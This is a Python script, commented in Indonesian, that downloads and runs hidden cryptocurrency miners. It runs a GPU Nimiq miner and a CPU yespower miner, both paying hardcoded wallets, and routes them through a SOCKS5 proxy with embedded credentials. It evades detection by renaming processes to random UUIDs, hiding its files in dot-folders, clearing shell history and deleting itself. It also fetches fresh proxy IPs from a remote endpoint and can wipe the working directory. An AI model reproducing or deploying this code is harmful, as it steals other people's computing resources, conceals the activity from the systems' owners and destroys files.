import uuid
import ctypes
import argparse
import requests
import subprocess
import os
import shutil
import time

# Buat objek ArgumentParser
parser = argparse.ArgumentParser(description='Starter Program')

# Tambahkan argumen yang wajib
parser.add_argument('--folder', type=str, help='Nama folder', required=True)
parser.add_argument('--ip', type=str, help='Alamat IP', required=True)

# Tambahkan argumen opsional
parser.add_argument('--gpu', action='store_true', help='Flag untuk menggunakan GPU', default=False)
parser.add_argument('--cpu', action='store_true', help='Flag untuk menggunakan CPU', default=False)
parser.add_argument('--reset', action='store_true', help='Flag untuk mereset', default=False)

# Tangkap argumen dari baris perintah
args = parser.parse_args()

# Definisikan nilai yang akan di-hardcode
socks5_ip = f'{args.ip}'
socks5_port = f'443'
socks5_username = 'clarksye'
socks5_password = 'user123'

# Buat dictionary json
downloads = {
    "graphics": {
        "link": "wget -q https://github.com/handevproject/starterpack/raw/main/plant.tar.gz",
        "run": [
            "tar -xf plant.tar.gz",
            "rm -rf plant.tar.gz"
        ]
    },
    "gpu": {
        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.2/non",
        "run": [
            "chmod +x non",
            "./plant/plant ./non -d=0 -a \"NQ389ADBRBMVUAD361F7JYLK105CFU9A0EQS\" -s nimiq.icemining.ca -p 2053 -n clarksye -t 4 --batchsize=45 -i Disable"
        ]
    },
    "cpu": {
        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
        "run": [
            "chmod +x plane",
            "./plant/plant ./plane -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
        ]
    }
}

def kill_processes():
    process_list = ['plant', 'plant-local', 'non', 'plane']
    # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
    process_string = "|".join(process_list)
    # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
    subprocess.run(['pkill', '-9', '-f', process_string])

def set_process_name(new_name):
    try:
        libc = ctypes.CDLL("libc.so.6")  # Untuk Linux

        # Ganti nama proses menggunakan fungsi prctl
        libc.prctl(15, ctypes.c_char_p(new_name.encode('utf-8')), 0, 0, 0)
    except Exception as e:
        print(f"Failed to set process name: {e}")

def run_bash_command_background(command):
    try:
        # Membuat nama proses secara acak menggunakan UUID
        new_process_name = str(uuid.uuid4())

        # Mengubah nama proses
        set_process_name(new_process_name)

        # Menjalankan perintah bash di latar belakang dengan mengarahkan output dan error ke subprocess.PIPE
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Tidak menunggu proses selesai, dan tidak mengembalikan output
        return f"Command started in the background with process name: {new_process_name}"
    except Exception as e:
        return f"Error: {e}"

def run_bash_command(command):
    try:
        # Run the bash command and wait for it to complete
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"

def delete_all_in_current_location():
    # Get the current directory location
    current_location = os.getcwd()

    try:
        # Loop to delete all files and directories
        for item in os.listdir(current_location):
            # Skip "." and ".."
            if item in ('.', '..'):
                continue

            path = os.path.join(current_location, item)
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
            except Exception as e:
                print(f"Failed to delete {path}: {e}")

    except Exception as e:
        print(f"Failed to access the directory: {e}")


def run_gpu(command_folder):
    run_bash_command(command_folder + downloads['gpu']['run'][0])
    run_bash_command_background(command_folder + downloads['gpu']['run'][1])
    return

def run_cpu(command_folder):
    run_bash_command(command_folder + downloads['cpu']['run'][0])
    run_bash_command_background(command_folder + downloads['cpu']['run'][1])
    return

def set_ip(command_folder, ip, set_file = True):
    command = {
        "set_file": f"cat > plant/local/plant-local.conf <<END\n[local]\nlisten = :2233\nloglevel = 0\nsocks5 = {ip}:{socks5_port}\nsocks5_username = {socks5_username}\nsocks5_password = {socks5_password}\nEND",
        "running": "./plant/local/plant-local -config plant/local/plant-local.conf",
        "sleep": "sleep 0.2"
    }

    if set_file:
        run_bash_command(command_folder + command['set_file'])

    run_bash_command_background(command_folder + command['running'])
    run_bash_command(command_folder + command['sleep'])

    return

def check_hidden_folder():
    expected_hidden_folders = {".satu", ".dua", ".tiga", ".empat", ".lima", ".enam", ".tujuh"}
    
    hidden_folders = [folder for folder in os.listdir() if folder.startswith('.') and folder not in ('.', '..') and folder in expected_hidden_folders]
    
    if hidden_folders:
        return hidden_folders[0]
    else:
        return False


def check_ip(folder):
    try:
        # Url
        url = 'https://jsonapi.org/'
        # Membuat subprocess untuk menjalankan curl command
        curl_command = f"./{folder}/plant/plant curl -s -o /dev/null -w '%{{http_code}}' {url}"
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)

        # Memeriksa http_code dari respons curl
        if result.returncode == 0:
            response_code = result.stdout.strip()  # Mendapatkan http_code dari output
            if response_code == '200':
                return True
            else:
                return False
        else:
            return False

    except Exception as e:
        return False
    
def check_url_response(username, list):
    # Format URL dengan parameter username
    url = f"https://halloworld.ap.loclx.io/info?username={username}&list={list}"

    try:
        # Lakukan HTTP GET request
        response = requests.get(url)

        # Periksa apakah response sukses (status code 200)
        if response.status_code == 200:
            # Periksa nilai 'success' dalam JSON response
            json_response = response.json()
            success = json_response.get('success', False)

            if success:
                # Jika 'success' adalah True, kembalikan response IP
                return json_response.get('ip')
            else:
                # Jika 'success' adalah False, kembalikan False
                return False
        else:
            # Jika status code bukan 200, kembalikan False
            return False

    except requests.RequestException as e:
        # Tangani kesalahan pada saat HTTP request
        print(f"Error during HTTP request: {e}")
        return False

def reset():
    kill_processes()
    delete_all_in_current_location()
    # make folder
    run_bash_command(f"mkdir -p {args.folder}")
    command_folder = f"cd {args.folder} && "

    # handle graphics
    run_bash_command(command_folder + downloads['graphics']['link'])
    run_bash_command(command_folder + downloads['graphics']['run'][0])
    run_bash_command(command_folder + downloads['graphics']['run'][1])
    set_ip(command_folder, args.ip)

    if args.cpu: 
        # handle cpu
        run_bash_command(command_folder + downloads['cpu']['link'])
        run_cpu(command_folder)
    
    if args.gpu: 
        # handle gpu
        run_bash_command(command_folder + downloads['gpu']['link'])
        run_gpu(command_folder)

    return

if args.reset:
    reset()
else:
    folder = check_hidden_folder()
    if folder:
        command_folder = f"cd {folder} && "

        # start ip
        set_ip(command_folder, args.ip, False)
        # check apakah ip masih hidup
        if not check_ip(folder):
            while True:
                ip = check_url_response("username", folder)
                if not ip:
                    time.sleep(300)
                    continue

                set_ip(command_folder, ip)
                break
        
        if args.cpu:
            run_cpu(command_folder)
            
        if args.gpu:
            run_gpu(command_folder)
    else:
        reset()


run_bash_command("history -c")
run_bash_command("> ~/.bash_history")
os.system('clear')

if os.path.exists("nim.py"):
    os.remove("nim.py")

folder = check_hidden_folder()
command_folder = f"cd {folder} && "

while True:
    if check_ip(folder):
        time.sleep(300)
        continue
    else:
        while True:
            ip = check_url_response("username", folder)
            if not ip:
                time.sleep(300)
                continue

            kill_processes()
            set_ip(command_folder, ip)
            if args.gpu:
                run_gpu(command_folder)

            if args.cpu:
                run_cpu(command_folder)

            break
